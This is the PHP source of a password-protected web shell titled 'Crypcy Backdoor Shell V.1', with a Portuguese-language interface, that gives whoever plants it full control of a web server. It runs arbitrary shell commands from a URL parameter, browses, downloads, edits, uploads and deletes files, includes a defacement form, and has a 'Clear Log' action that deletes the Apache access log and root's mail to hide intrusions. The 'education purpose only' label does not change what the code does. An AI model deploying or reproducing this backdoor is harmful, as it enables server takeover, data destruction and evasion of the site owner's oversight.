<?php

	session_start();
	$senha = "cryptolab";

	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}
	if($_POST['senha'] == $senha){
		$_SESSION['login'] = 1;
	}
	if($_GET['logout']){
		$_SESSION['login'] = 0;
	}

	if($arquivo = $_GET['download']){
		download($arquivo);
	}
?>

<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Crypcy Backdoor Shell V.1</title>
	<meta charset="utf-8">
<style>
*{box-sizing: border-box;}
.row::after {content: "";clear: both;display: block;}
[class*="col-"] {float: left;padding: 15px;}
.col-1 {width: 8.33%;}
.col-2 {width: 16.66%;}
.col-3 {width: 25%;}
.col-4 {width: 33.33%;}
.col-5 {width: 41.66%;}
.col-6 {width: 50%;}
.col-7 {width: 58.33%;}
.col-8 {width: 66.66%;}
.col-9 {width: 75%;}
.col-10 {width: 83.33%;}
.col-11 {width: 91.66%;}
.col-12 {width: 100%;}
html {font-family: "Lucida Sans", sans-serif;}
body{background-color: #090909; margin:0; padding:0; color:#eee;}
a{text-decoration: none;}
a:hover{color:white;}
<?php

if(!$_SESSION['login']){
	echo"
	#login form{margin:0 auto;width:250px;}
	#login h2{text-align: center;}
	#login input{padding:5px;border: solid 1px #4c4a4a;background-color:#2681d6;margin:2px 0 2px 0;}
	#login input:focus{border: solid 1px blue;}
	#login #senha{width:238px;}
	#login #entrar{width:100%;}
	#login #entrar:hover{width:100%;cursor:pointer;background-color:#2681d6;color:#2681d6;}
	";
}
else{
	echo "
	h2 a{text-decoration: none;}
	#rodape{color:#aaa;text-decoration: none;}
	#rodape:hover{color: white;}
	#upar{padding: 8px;}
	input{padding:5px;border: solid 1px #4c4a4a;background-color:#4c4a4a;}
	input:hover{cursor:pointer;background-color:#222;color:white;}
	.container{width:98%;margin:0 auto;}
	tr:hover{background-color:#333;}
	li{display: inline-block;width:100px;}
	li a{color:white;}
	li a:hover{color:#175ac6;}
	li:hover{color:#175ac6;cursor:pointer;}
	table{width:100%;background-color:#141414;border-radius: 5px;border: 1px solid #222;border-spacing: 0px;}
	body, h1 a{text-decoration: none;}
	th,td{text-align: left;width:200px;}
	form{padding:5px;margin-top:10px;margin-bottom:10px;border-radius: 5px;}
	a{color:#175ac6;}
	.check{width:30px;}
	.linha::after{content: '';clear: both;display: block;background-color:#aaa;}
	#info{width:100%;padding:10px;float:left;border: solid 1px #222;background-color:#4c4a4a;margin-top:10px;}
	#logo{float:left;text-align: center;}
	#menu{text-align: center;padding:0px;}
	#logo h2{height:1px;}
	#shell{float: left;width: 100%;}
	section{background-color: #141414;border-radius: 5px;border: 1px solid #222;width:100%;}
	section header{padding:10px;background-color: #222;}
	section article{padding:10px;}
	";
}
?>
</style>
</head>
<body>
<div class="container">
<?php
if(!$_SESSION['login']){
	login();
}
else{
	painel($diretorio);
}
function painel($diretorio){

	echo "
	<div class='row'>
		<div class='col-4'>
			<div id='info'>
				<small>
				Kernel: ".php_uname('r')."<br />
				Machine: ".php_uname('m')."<br />
				Os: ".php_uname('n')."<br />
				Ip: ";echo $_SERVER[REMOTE_ADDR];echo"<br />
				Host: ";echo $_SERVER[HTTP_HOST];echo "<br />
				Data: ".date(d)."/".date(m)."/".date(Y)."<br />
				Hora: ".date(H).":".date(i).":".date(s)."<br />
				Software: "; echo $_SERVER[SERVER_SOFTWARE];echo"<br />
				</small>
			</div>
		</div>

		<div class='col-4' id='logo'>
			<a href='47+crypcy.php' title='Home'>
				<h2>Crypcy Backdoor Shell V.1</h2>
			</a>
		</div>

		<div class='col-4'>
			<div id='info'>
				<small>
				Kernel: ".php_uname('r')."<br />
				Machine: ".php_uname('m')."<br />
				Os: ".php_uname('n')."<br />
				Ip: ";echo $_SERVER[REMOTE_ADDR];echo"<br />
				Host: ";echo $_SERVER[HTTP_HOST];echo "<br />
				Data: ".date(d)."/".date(m)."/".date(Y)."<br />
				Hora: ".date(H).":".date(i).":".date(s)."<br />
				Software: "; echo $_SERVER[SERVER_SOFTWARE];echo"<br />
				</small>
			</div>
		</div>
	</div>
	";

	echo "
	<div class='row'>
		<div class='col-12' id='menu'>
		<nav>
			<ul>
				<li><a href='/47+crypcy.php'>Archive</a></li>
				<li><a href='?pag=comandos'>Commands</a></li>
				<li><a href='?pag=dellog'>Clear Log</a></li>
				<li><a href='?pag=info'>Info</a></li>
			</ul>
		</nav>
		</div>
	</div>
	";

	if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
		renomea_arquivo($renomear, $antigo, $pasta);
	}
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
		echo "Archive Saved!";
	}
	if($editar = $_GET['editar']){
		editar($editar);
	}
	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}
	if($upar = $_FILES['upload']){
		upload($upar, $diretorio);
	}
	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
		salvar($criar, "$diretorio/$nome");
		echo "Archive Saved!";
	}
	if($novo = $_GET['novo']){
		criar($novo);
	}
	if($deface = $_GET['deface']){
		deface($deface);
	}
	if($menu = $_GET['menu']){
		if($menu == "comandos"){
			executar($diretorio);
			exit();
		}
	}

	$page = $_GET['pag'];

	if($page == 'crypto'){
		echo "
			<section>
				<header>Cryptosec Lab</header>
				<article>
				CryptoSec Lab
				</article>
			</section>
		";
	}

	else if($page == 'comandos'){

		echo "
			<section>
				<header>Shell Commands</header>
				<article>
				";
				if($cmd = $_GET['cmd']){
					cmd($cmd, $diretorio);
				}
				executar();
				echo"
				</article>
			</section>
		";
	}

	else if($page == 'info'){
		
			echo "
			<section>
				<header>Infomation</header>
				<article>
				Education purpose only ! - Enjoy :)
				</article>
			</section>
		";
	}
	else if($page == 'renomear'){
		$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
		renomear($arquivo, $dir);
	}

	else if($page == 'whois'){
		echo "
		<section>
		<header>Whois</header>
		<article>
		CryptoSec Lab
		</article>
		</section>
		";
	}

	else if($page == 'dellog'){
		echo "
		<section>
		<header>Clear Log</header>
		<article>
		";dellog();echo"
		</article>
		</section>
		";
	}


	else{
		listar($diretorio);	
	}
	echo "<center><a id='rodape' href='https://github.com/akalankauk'>CryptoSec Lab</a></center>";
}


function login(){
	echo "
	<div id='login'>
		<form method='post'>
			<h2>Crypcy Backdoor Shell V.1</h2>
			<label>Please Enter Your Password:</label><br/>
			<input id='senha' type='password' name='senha'>
			<input id='entrar' type='submit' value='Login'>
		</form>	
	</div>
	";	
}

function reverse($host){
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$host");
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	$json = curl_exec($ch);
	$array = get_object_vars(json_decode($json));
	echo "<center>";
	echo "Total: $array[domainCount]<br />";
	echo "Host: $array[remoteAddress]<br />";
	echo "Ip: $array[remoteIpAddress]<br /><br />";
	echo "</center>";
	echo "<table style='border:0px'>";
	foreach($array[domainArray] as $dominio){
		echo "<tr><td><a target='_blank' href='http://$dominio[0]'>$dominio[0]</a></td></tr>";
	}	
	echo "</table>";
}

function permissao($arquivo){
	$perms = fileperms($arquivo);
	if(($perms&0xC000)==0xC000)$info='s';
	elseif(($perms&0xA000)==0xA000)$info='l';
	elseif(($perms&0x8000)==0x8000)$info='-';
	elseif(($perms&0x6000)==0x6000)$info='b';
	elseif(($perms&0x4000)==0x4000)$info='d';
	elseif(($perms&0x2000)==0x2000)$info='c';
	elseif(($perms&0x1000)==0x1000)$info='p';
	else $info='u';
	$info.=($perms&0x0100)?'r':'-';
	$info.=($perms&0x0080)?'w':'-';
	$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
	$info.=($perms&0x0020)?'r':'-';
	$info.=($perms&0x0010)?'w':'-';
	$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
	$info.=($perms&0x0004)?'r':'-';
	$info.=($perms&0x0002)?'w':'-';
	$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
	return $info;
}

function anterior($dir){
	$dir = explode("/",$dir);
	unset($dir[count($dir)-1]);
	if($dir[1] == ""){
		$dir[0] = "/";
	}
	return implode("/",$dir);
}

function listar($dir){
	$anterior = anterior($dir);
	echo "
	<div class='row'>
	<div class='col-12'>

		<table>
			<tr style='background-color:#222'>
				<th class='check'><input type=checkbox></input></th>
				<th>Archive</th>
				<th>Permission</th>
				<th>File Size</th>
				<th>Action</th>
			</tr>
	";
	foreach(scandir($dir) as $nome){
		$file = "$dir/$nome";
		if($nome ==".."){
			echo "<tr>";
			echo "<td class='check'></td>";
			echo "<td><a href=?ls=$anterior title='Return To..'> -- Go Back </a></td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "</tr>";	
		}
		if(!is_file($file) and $nome != ".." and $nome != "."){
			echo "<tr>";
			echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
			echo "<td><a href=?ls=$file>$nome</a></td>";
			echo "<td>".permissao("$dir/$nome")."</td>";
			echo "<td></td>";
			echo "<td></td>";
			echo "</tr>";
		}
		if($nome != "." && $nome !=".." && is_file($file)){
			echo "<tr>";	
			echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
			echo "<td>".$nome."</td>";
			echo "<td>".permissao("$dir/$nome")."</td>";
			echo "<td>".filesize($file)." bytes</td>";
			echo "<td>
				<a href='?download=$file' title='Download This File.'>D</a>
				<a href='?pag=renomear&arquivo=$nome&pasta=$dir' title='Rename This File'>R</a>
				<a href='?editar=$file' title='Edit This File'>E</a>
				<a href='?deletar=$file' title='Remove This File'>R</a>
				</td>";
			echo "</tr>";
		}
	}
	echo "</table>
		</div>
	</div>
	<div class='row'>
		<div class='col-4'>
			";acao();echo"
		</div>
		<div class='col-4'>
			";upar($diretorio);echo"
		</div>
	</div>
	";
}

function download($arquivo){

    header('Content-Type: application/octet-stream');
    header('Content-Length: '.filesize($arquivo));
    header('Content-Disposition: filename='.$arquivo);
    readfile($arquivo);
    exit();
}

function editar($editar){
	echo "<form action=47+crypcy.php method=post>";
	$arq = file($editar);
	echo "<input name=arquivo type=hidden value='$editar'>";
	echo "<textarea name=salvar cols=100 rows=10>";
	foreach($arq as $linha){
		echo htmlspecialchars($linha);
	}
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=Save>";
	echo "</form>";
	exit();
}

function renomear($arquivo, $dir){
	echo"
	<section>
		<header>Informações</header>
		<article>
		";
		echo "<form action=47+crypcy.php method=post>";
		$arq = file($editar);
		echo "<input name=pasta type=hidden value='$dir'>";
		echo "<input name=antigo type=hidden value='$arquivo'>";
		echo "<label>New File Name:</label>";
		echo "<input name=renomear type=text value='$arquivo'>";
		echo "<br />";
		echo "<input type=submit value=Rename it.>";
		echo "</form>";
		echo"
		</article>
	</section>
	";
	
	exit();
}

function renomea_arquivo($novo, $antigo, $dir){
	rename("$dir/$antigo", "$dir/$novo");
	echo "File Archive";
}

function criar($diretorio){
	echo "<form action=47+crypcy.php method=post>";
	$arq = file($editar);
	echo "<label>Nome do arquivo:</label><br/>";
	echo "<input type='text' name='nome'/><br/>";
	echo "<input type='hidden' diretorio='$diretorio'/>";
	echo "<label>Conteudo:</label><br/>";
	echo "<textarea name=criar cols=100 rows=10>";
	foreach($arq as $linha){
		echo htmlspecialchars($linha);
	}
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=criar>";
	echo "</form>";
	exit();
}

function deface($diretorio){
	echo "<form action=47+crypcy.php method=post>";
	$arq = file($editar);
	echo "<label>Nome da team:</label><br/>";
	echo "<input type='text' name='nome'/><br/>";

	echo "<label>Greatz:</label><br/>";
	echo "<input type='text' greatz='nome'/><br/>";

	echo "<input type='hidden' diretorio='$diretorio'/>";
	echo "<label>Mensagem:</label><br/>";
	echo "<textarea name=mensagem cols=100 rows=10>";
	echo "</textarea>";
	echo "<br />";
	echo "<input type=submit value=gerar deface>";
	echo "</form>";
	exit();
}

function salvar($dados, $arquivo){
	$fp = fopen($arquivo, "w");
	fwrite($fp,$dados);
	fclose($fp);
}

function deletar($arquivo){
	unlink($arquivo);
	echo "Archive Removed!";
}

function acao(){
	echo "
	<form>
	<label>Bulk Action:</label><br/>
	<select style='width:150px'>
		<option>--</option>
		<option>Remove All Selected</option>
	</select>
	<input type='submit' value='Run'></input>
	</form>
	";
}

function upar($diretorio){
	echo "
	<center>
	<form class=upar enctype='multipart/form-data' action='47+crypcy.php' method='post'>
		<label>Upload Files:</label><br />
		<input type='file' name='upload'/>
		<input type='hidden' diretorio='$diretorio'/>
		<input id='upar' type='submit' value='Upload'/>
	</form>
	</center>
	";

}


function upload($arquivo, $diretorio){
	if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
		echo "Upado com sucesso! :D";
	}
}

function navegar($diretorio){
	echo "
	<form class=upar action='47+crypcy.php' method='get'>
		<input style='min-width:";echo strlen($diretorio)*10;echo "px' type='text' name='ls' value='$diretorio'/>
		<input type='submit' value='Acessar'/>
	</form>";

}

function executar($diretorio){
	echo "
	<form class=upar action='47+crypcy.php?' method='get'>
		<input type='hidden' name'diretorio' value='$diretorio'/>
		<input type='hidden' name='pag' value='comandos'/>
		<input style='width:210px' type='text' name='cmd' value=''/>
		<input type='submit' value='Run'/>
	</form>";

}
function cmd($cmd, $diretorio){
	$p = popen("($cmd)2>&1","r");
	while(!feof($p)){
		echo fgets($p,1000)."<br/>";
	}
}
function dellog(){
	system("rm -fr /var/log/apache2/access.log");
	system("rm -fr /var/mail/root");
	echo "Log Cleared!";
}
?>
</div>
</body>
</html>